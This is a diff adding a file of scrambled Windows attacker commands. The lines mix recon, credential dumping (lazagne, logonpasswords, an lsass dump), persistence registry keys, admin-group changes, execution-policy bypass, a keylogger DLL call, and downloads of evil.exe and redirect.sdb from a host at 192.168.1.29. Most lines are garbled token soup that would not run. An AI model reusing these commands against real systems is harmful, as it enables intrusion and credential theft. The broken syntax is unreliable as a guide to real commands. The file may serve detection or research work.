@@ -1,0 +1,64 @@
+copy $ hklm\software\microsoft\windows filter=set-wmiinstance \\ t1547.009 name you copy \system\currentcontrolset\services\winsock2\parameters name \inprocserver32 , http http http http http : //192.168.1.29:9000/payload/evil.exe -o ; } ; name = http http http http http : -r '' , http http : //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb os ; os.system ( 'https
+iediagcmd.exe /out '' $ dllname /d $ true
+net localgroup administrators `` cor_profiler '' /t reg_dword /d 1
+systeminfo
+ffuf -w $ { domain }
+$ shortcut = set-wmiinstance file c http : \windows\temp\lsass_dump.dmp
+python make_image.py $ shortcut = `` shadow `` cor_profiler '' -name $ _.status packages file ''
+new-localuser -name `` domain admins '' '' -l $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ administrators ''
+wlrmdr.exe -s $ cor_profiler '' -name `` lsadbextpt '' ''
+psr.exe /start /output $ { user_name } /f
+at.exe $ ( `` hklm\software\microsoft\windows user_name '' '' objws.run administrators $ : cor_profiler ''
+auditpol -classname win32_processor \\ $ i ) ; ;
+powershell -executionpolicy bypass
+assoc $ t1547.009 /server shadow vulnerable_version_of_amsi.dll } ;
+conhost.exe get-ciminstance http : :dcsync os menu\programs\startup\atmoic.lnk shadow source_file_path ) \\ $ ( new-object -comobject \secrets ( c : \programdata\microsoft\windows\start options\osk.exe '' '' ;
+net localgroup `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d 1
+python zero_padding.py $ : \windows\system32\ $ { domain admins = `` $ ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' t1547.009 @ `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' ;
+net localgroup `` security file execution options\svchost.exe '' options\svchost.exe '' /grant administrators ''
+nbtstat -n
+bitsadmin.exe /create $ administrators ''
+rundll32 popcalc.dll , keylog
+set-executionpolicy -executionpolicy bypass
+quser
+namp -sn -l $ { shadow volumn name you copy set-wmiinstance file name components\atomic_test '' /grant keylog
+iediagcmd.exe /out : $ `` hklm\system\currentcontrolset\control\session '' \users\
+exit -- administrators c : cor_profiler ''
+$ shadow copy os ; ; scripttext= team '' -a # : '' /d $ { binary_file_path }
+takeown /f \\ $ { administrators '' ;
+rundll32.exe \\ $ i = `` $ ) ; in administrators '' -name $ { hklm\software\microsoft\windows setup\installed file file c http http : \users\ -u $ consumer ; -d $ cor_profiler = administrators ''
+get-ciminstance /set ] : set-wmiinstance -namespace http : new-object net.webclient ) set .. * binpath=
+nbtstat -n $ '' /d 1 /f
+[ -classname win32_operatingsystem { localappdata % \microsoft\teams\current\teams.exe
+sharprdp.exe -sn command= '' /add admins '' c http '' c filter -name cor_profiler '' -name $ hklm\system\currentcontrolset\control\print\monitors\atomicredteam ''
+quser
+lazagne.exe windows
+copy $ hklm\software\microsoft\windows -r '' -l $ shell.createshortcut administrators '' ;
+namp -sn -l $ target t1547.009 \programdata\microsoft\windows\start /export `` ; binpath= ''
+net localgroup administrators `` hklm\system\currentcontrolset\control\session /v `` cor_profiler = `` \inprocserver32 '' '' threadingmodel ''
+winrar a -ibck -ibck
+get-eventlog -list | foreach-object ( new-object net.webclient \\ localappdata ) http //192.168.1.29:9000/payload/redirect.sdb -o os ; ; -n reg_dword
+gpresult /z
+reg add `` driver % user_name }
+$ shortcut = `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy `` `` .\lazagne .. -f http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+ffuf -w $ { t1547.009 -u domain -t '' -u $ { binary } &
+nbtstat -n $ ( { :logonpasswords
+psr.exe /start /output $ { administrators '' /f
+namp -sn $ target t1547.009 in hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest ''
+tree
+nmap -o [ text.encoding -classname win32_operatingsystem | select-object -expandproperty
+python -executionpolicy bypass -scope -command -scope
+net accounts
+sc.exe create { `` administrators '' , cor_profiler = administrators '' /t reg_dword
+nmap -o $ defaultaccount \inprocserver32 , threadingmodel ''
+curl http : set-wmiinstance -namespace http : -r -o ''
+nmap -o $ `` cor_profiler '' /t reg_multi_sz
+wevtutil os ; os.system iex ( http http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+$ ( `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -name `` threadingmodel '' /t threadingmodel ''
+net localgroup administrators `` .\lazagne /v cor_profiler administrators ''
+nbtstat -n
+net localgroup `` administrators '' '' -c cor_profiler '' ''
+get-childitem -filter `` hklm\software\microsoft\active | localappdata ; -a and \microsoft\teams\current\teams.exe
+nbtstat -n /add
+net localgroup `` cor_profiler /grant administrators '' /t cor_profiler ''
